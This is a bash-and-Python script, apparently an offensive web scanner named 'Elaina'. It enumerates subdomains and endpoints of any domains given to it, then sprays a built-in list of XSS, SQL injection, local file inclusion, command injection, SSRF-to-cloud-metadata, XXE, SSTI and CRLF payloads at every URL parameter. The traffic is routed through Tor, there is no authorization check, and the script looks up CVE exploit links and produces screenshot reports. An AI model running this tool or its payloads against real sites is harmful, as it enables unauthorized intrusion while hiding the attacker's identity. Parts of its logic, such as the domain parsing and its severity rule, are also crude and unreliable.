#!/bin/bash
domains=("$@")
if [ ${#domains[@]} -eq 0 ]; then
    echo "Usage: $0 domain1.com domain2.com ..."
    exit 1
fi

command -v go >/dev/null 2>&1 || { pkg install golang -y; }
pip install --upgrade pip >/dev/null
pip install requests beautifulsoup4 selenium openpyxl fpdf python-dotenv colorama xlsxwriter pillow pandas jinja2 dash dash_table dash_html_components dash_core_components >/dev/null

go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/bp0lr/gauplus@latest
export PATH=$PATH:$(go env GOPATH)/bin
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
source ~/.bashrc

for domain in "${domains[@]}"; do
    subfinder -d $domain -o subs_$domain.txt
    httpx -list subs_$domain.txt -status-code -title -o live_$domain.txt
    katana -list live_$domain.txt -o endpoints_$domain.txt
    gauplus -random-agent -t 10 -p $domain -o gau_$domain.txt
done

python3 - << 'PYTHON_EOF'
import os, requests, threading, random, time
from concurrent.futures import ThreadPoolExecutor, as_completed
import pandas as pd
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from jinja2 import Template

MAX_THREADS = 10
TOR_PROXY = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
SCREENSHOT_DIR = 'screenshots'
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

payload_types = {
    'xss':['<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg/onload=alert(1)>','"><svg/onload=alert(1)>','{{7*7}}','<iframe srcdoc="<script>alert(1)</script>">'],
    'sqli':["' OR '1'='1","' OR sleep(5)--","' UNION SELECT null,null--"],
    'lfi':["../../../../etc/passwd","php://filter/convert.base64-encode/resource=index.php"],
    'rce':[";id","$(whoami)","`ls`"],
    'ssrf':["http://169.254.169.254/latest/meta-data/","file:///etc/passwd"],
    'ssti':["{{7*7}}","${7*7}","<%= 7*7 %>"],
    'xxe':["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"],
    'redirect':["http://example.com/redirect?url=https://evil.com"],
    'crlf':["%0d%0aSet-Cookie:evil=1"],
    'cache':["?q=test&v=1"],
    'jwt':["Bearer abcdef123456"],
    'json':['{"a": "__import__(\'os\').system(\'id\')"}'],
    'file':["shell.php"],
    'template':["{{7*7}}"]
}

all_payloads = [p for sublist in payload_types.values() for p in sublist]
colors = {'xss':'yellow','sqli':'red','lfi':'blue','rce':'orange','ssrf':'green','ssti':'purple','xxe':'pink','redirect':'cyan','crlf':'grey','cache':'brown','jwt':'lime','json':'teal','file':'magenta','template':'gold'}
results = []
lock = threading.Lock()

def fetch_cve(server):
    cves=[]
    try:
        r=requests.get(f'https://cve.circl.lu/api/search/{server}',timeout=10)
        j=r.json()
        for item in j.get('results',[]):
            cves.append({'id':item.get('id'),'cvss':item.get('cvss'),'summary':item.get('summary'),'exploit':item.get('references')[0] if item.get('references') else ''})
    except: pass
    return cves

def ai_risk_score(payload,severity,cvss):
    return min(cvss+(5 if 'RCE' in payload.upper() else 0)+(3 if severity=='High' else 0),10)

def detect_type(payload):
    for k in colors.keys():
        if k in payload.lower(): return k
    return 'other'

def try_payload(url,param,payload):
    try:
        r=requests.get(url,params={param:payload},timeout=10,proxies=TOR_PROXY)
        severity='High' if payload in r.text else 'Low'
        score=9.0 if severity=='High' else 3.0
        server=r.headers.get('Server','Unknown')
        cves=fetch_cve(server)
        ai_score=ai_risk_score(payload,severity,score)
        result={'url':url,'param':param,'payload':payload,'severity':severity,'score':score,'ai_score':ai_score,'server':server,'cves':cves,'type':detect_type(payload)}
        with lock:
            results.append(result)
        return result
    except:
        return None

domains=[f.split('_')[1].split('.')[0] for f in os.listdir('.') if f.startswith('endpoints_')]
endpoints_map = {}
for domain in domains:
    with open(f'endpoints_{domain}.txt') as f:
        endpoints=[line.strip() for line in f if line.strip()]
        endpoints_map[domain] = [e for e in endpoints if '?' in e]

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    futures=[]
    for domain,endpoints in endpoints_map.items():
        for url in endpoints:
            params=[p.split('=')[0] for p in url.split('?')[1].split('&')]
            for param in params:
                for payload in all_payloads:
                    futures.append(executor.submit(try_payload,url,param,payload))
    for f in as_completed(futures):
        _=f.result()

options=Options()
options.headless=True
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
driver=webdriver.Chrome(options=options)
timeline={}

for idx,item in enumerate(results):
    try:
        driver.get(item['url'])
        driver.execute_script(f"var span=document.createElement('span');span.style.background='{colors.get(item['type'],'white')}';span.innerText='{item['payload']}';document.body.prepend(span);")
        screenshot_path=f"{SCREENSHOT_DIR}/{item['param']}_{idx}.png"
        driver.save_screenshot(screenshot_path)
        item['screenshot']=screenshot_path
        timeline.setdefault(item['url'],[]).append({'payload':item['payload'],'screenshot':screenshot_path,'step':idx})
    except: continue
driver.quit()

df=pd.DataFrame(results)
with pd.ExcelWriter('report.xlsx',engine='xlsxwriter') as wb:
    df.to_excel(wb,sheet_name='ScanResults',index=False)

html_template="""
<html>
<head>
<title>Elaina Interactive Report</title>
<script src="https://cdn.datatables.net/1.10.22/js/jquery.dataTables.min.js"></script>
<link rel="stylesheet" href="https://cdn.datatables.net/1.10.22/css/jquery.dataTables.min.css"/>
<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
<style>
.timeline-step {border:2px solid #000;margin:5px;padding:5px;}
</style>
</head>
<body>
<h1>Elaina Interactive Scan Report</h1>
<table id="report" border="1">
<tr>
<th>URL</th><th>Param</th><th>Payload</th><th>Severity</th><th>CVSS</th><th>AI Score</th><th>Server</th><th>CVE</th><th>Exploit</th><th>Screenshot</th><th>Timeline</th>
</tr>
{% for item in results %}
<tr>
<td>{{item.url}}</td>
<td>{{item.param}}</td>
<td>{{item.payload}}</td>
<td>{{item.severity}}</td>
<td>{{item.score}}</td>
<td>{{item.ai_score}}</td>
<td>{{item.server}}</td>
<td>{% if item.cves %}{{item.cves[0]['id']}}{% endif %}</td>
<td>{% if item.cves %}{{item.cves[0]['exploit']}}{% endif %}</td>
<td>{% if item.screenshot %}<img src='{{item.screenshot}}' width=150>{% endif %}</td>
<td>
{% for step in timeline[item.url] %}
<div class="timeline-step"><b>Step {{step.step}}</b>: {{step.payload}}<br><img src="{{step.screenshot}}" width=100></div>
{% endfor %}
</td>
</tr>
{% endfor %}
</table>
<script>
$(document).ready(function() {
$('#report').DataTable({"paging":true,"searching":true,"order":[[4,'desc']]});
});
</script>
</body></html>
"""
t=Template(html_template)
with open('report_interactive.html','w') as f: f.write(t.render(results=results,timeline=timeline))
print("[*] Elaina scan complete. Reports: report.xlsx, report_interactive.html, screenshots/")
PYTHON_EOF
